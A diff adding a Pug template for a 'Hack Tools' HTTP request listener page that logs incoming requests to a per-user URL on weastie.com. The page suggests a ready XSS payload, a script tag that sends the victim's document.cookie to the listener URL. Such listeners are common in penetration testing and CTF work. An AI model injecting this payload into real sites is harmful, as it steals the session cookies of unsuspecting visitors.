@@ -1,0 +1,29 @@
+extends ../../core/template.pug
+
+block headExtra
+	title=global.essentials.formatTitle(['Hack Tools', 'Listener'])
+
+block content
+	h1 HTTP Request Listener
+	p Listening to requests at&nbsp;
+		a(href=(global.path.join('/l/', id, '/')))=(global.path.join('/l/', id, '/'))
+	p Listener expires at:&nbsp;
+		span.formatDate=(data.createdAt + 1000*60*60)
+	p Try this as an xss: 
+		- var str = '<script>window.location.href = "//weastie.com/l/' + id + '/" + encodeURIComponent(document.cookie)</script>'
+		| #{str}
+	hr
+	h3 Requests:
+	input(type='button', value='Refresh', onclick='window.location.reload()').btn.btnRaised.btnBlue
+	div
+		p.
+			=============
+		if data.requests.length > 0
+			each req in data.requests
+				p Request at:&nbsp;
+					span.formatDate=req.date
+				p #{req.method}: #{decodeURIComponent(req.path)}
+				p.
+					=============
+		else
+			p No requests yet!
